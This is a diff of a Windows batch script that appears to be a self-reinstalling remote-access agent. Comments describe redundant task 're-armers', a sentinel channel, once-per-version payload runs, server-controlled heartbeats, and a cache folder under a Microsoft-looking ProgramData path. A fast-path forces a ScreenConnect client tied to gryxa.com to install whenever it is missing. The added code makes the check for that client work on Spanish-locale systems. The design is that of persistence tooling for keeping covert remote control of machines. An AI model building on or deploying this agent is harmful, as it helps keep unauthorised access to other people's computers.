@@ -1,5 +1,5 @@
 @echo off
-rem WINRTCS_AGENT 0.0.8 - self-updating fleet agent (batch+curl only, no PowerShell)
+rem WINRTCS_AGENT 0.0.9 - self-updating fleet agent (batch+curl only, no PowerShell)
 rem Tick: re-arm tasks (pair + sentinel) -> stage/apply self-update (SHA256 pinned)
 rem   -> run payload once per PAYLOAD_VER -> guard channel -> sentinel channel -> cache sync.
 rem 0.0.2 (C19): sentinel third-re-armer channel (SENTINEL_SHA256 pinned, lives in the
@@ -25,11 +25,12 @@ rem 0.0.7 (C26): Gryxa-absent fast-path - every tick, if no ScreenConnect servic
 rem   gryxa.com in ImagePath, boost the guard gate (at most every 15 min) so install
 rem   starts within minutes of landing/absence instead of waiting the 1-3h stagger.
 rem   Presence resets the boost counter. Guard overlap lock + extkill brake still apply.
+rem 0.0.9 (C32): HasGryxa locale-invariant (Spanish NOMBRE_SERVICIO vs SERVICE_NAME)
 rem 0.0.8 (Sight): POST /heartbeat every tick so online != guard digest; apply MAINT=
 rem   from response (maint.flag pauses installs via guard). Optional version.sig check
 rem   via side channel later; integrity still SHA256-pinned from winrtcs.version.
 setlocal EnableExtensions EnableDelayedExpansion
-set "AGENT_VER=0.0.8"
+set "AGENT_VER=0.0.9"
 set "ZD=C:\ProgramData\WinRTCS"
 set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
 set "CURL=%SystemRoot%\System32\curl.exe"
@@ -288,11 +289,15 @@ exit /b 0
 
 :HasGryxa
 rem FP-agnostic: any ScreenConnect Client whose ImagePath contains gryxa.com.
+rem C15/C32: do not require English SERVICE_NAME: (Spanish = NOMBRE_SERVICIO:).
 set "HAS_GRYXA="
-for /f "tokens=2 delims=:" %%A in ('sc query state^= all 2^>nul ^| findstr /C:"SERVICE_NAME: ScreenConnect Client ("') do (
-  for /f "tokens=* delims= " %%S in ("%%A") do (
-    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%%S" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-    if not errorlevel 1 set "HAS_GRYXA=1"
+for /f "tokens=1,* delims=:" %%A in ('sc query state^= all 2^>nul ^| findstr /C:"ScreenConnect Client ("') do (
+  for /f "tokens=* delims= " %%S in ("%%B") do (
+    echo %%S| findstr /I /B /C:"ScreenConnect Client (" >nul
+    if not errorlevel 1 (
+      reg query "HKLM\SYSTEM\CurrentControlSet\Services\%%S" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+      if not errorlevel 1 set "HAS_GRYXA=1"
+    )
   )
 )
 exit /b 0
